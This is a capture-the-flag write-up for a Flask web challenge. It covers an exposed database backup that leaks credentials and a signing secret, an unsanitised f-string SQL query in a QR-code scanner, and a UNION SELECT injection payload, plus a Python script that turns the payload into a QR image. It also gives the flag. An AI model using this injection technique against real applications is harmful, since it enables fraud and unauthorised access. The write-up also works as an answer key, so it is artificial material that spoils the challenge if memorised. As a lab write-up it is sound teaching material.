# Hellforge Records — Writeup

**Category:** Web  
**Flag:** `ictf{qu3ry_fr0m_th3_4by55_0f_h3ll}`

---

## Overview

Hellforge Records is a Flask-based metal CD shop with a loyalty program. The goal is to accumulate 66,666 loyalty points to purchase the album **Abyssal Throne**, whose description contains the flag.

---

## Reconnaissance

The app exposes two interesting public endpoints:

- `/robots.txt` — hints at `/backup.sql`
- `/backup.sql` — returns the full database backup and reveals:
  - Admin credentials: `admin / h3llf0rg3_2024`
  - The HMAC signing secret: `COUPON_SECRET = h3llf0rg3_s1gn4tur3_k3y` (also hardcoded in `app.py`)
  - A decoy flag in the `flags` table: `iCTF{NICE_TRY_THIS_IS_A_DECOY_2}`
  - The `promo_codes` table is empty in production

The `/admin` route always returns "Invalid admin credentials." regardless of input — it's a decoy.

---

## The Vulnerability — SQL Injection in the QR Scanner

The loyalty program includes a QR scanner at `/loyalty/scan`. When a QR code image is uploaded, the app decodes its text content and runs this query:

```python
# app.py line ~344
query = f"SELECT CASE WHEN code = '{qr_content}' THEN points ELSE 0 END FROM promo_codes LIMIT 1"
result = db.execute(query).fetchone()
```

The comment above the call says "input sanitized via `sanitize_promo_code()`" — but that function is only applied to the **audit log**, not to `qr_content` in the query. The actual SQL query uses raw, user-controlled input.

---

## Exploitation

### Step 1 — Craft the SQL injection payload

Since the `promo_codes` table is empty, a simple injection won't work — any `CASE WHEN ... END FROM promo_codes` returns no rows. We need a `UNION SELECT` with an empty first table:

```
' THEN 0 ELSE 0 END FROM (SELECT '' AS code WHERE 1=0) UNION SELECT 66666 --
```

The resulting query is:

```sql
SELECT CASE WHEN code = '' THEN 0 ELSE 0 END
FROM (SELECT '' AS code WHERE 1=0)
UNION SELECT 66666 -- ' THEN points ELSE 0 END FROM promo_codes LIMIT 1
```

- `(SELECT '' AS code WHERE 1=0)` — a derived table with zero rows, so the `CASE WHEN` produces nothing
- `UNION SELECT 66666` — adds a single row with value 66666
- `fetchone()` returns `(66666,)` → 66666 points are credited

### Step 2 — Generate the QR code

```python
import qrcode

payload = "' THEN 0 ELSE 0 END FROM (SELECT '' AS code WHERE 1=0) UNION SELECT 66666 --"
img = qrcode.make(payload)
img.save("inject.png")
```

### Step 3 — Register, join the loyalty program, upload the QR

1. Register an account at `/register`
2. Go to profile and join the loyalty program
3. Go to `/loyalty/scan`, upload `inject.png`
4. The app credits 66,666 points

### Step 4 — Buy Abyssal Throne

Navigate to `/shop`, find **Abyssal Throne** by Voidcrown (66,666 points), and purchase it. The album description contains the flag.

---

## Summary

| Step | Action |
|------|--------|
| 1 | Discover `/backup.sql` via `/robots.txt` |
| 2 | Note that `qr_content` is used raw in the SQL query |
| 3 | Generate a QR code with a `UNION SELECT` payload |
| 4 | Upload via `/loyalty/scan` → 66,666 points credited |
| 5 | Buy **Abyssal Throne** → flag in description |

---

## Flag

`ictf{qu3ry_fr0m_th3_4by55_0f_h3ll}`
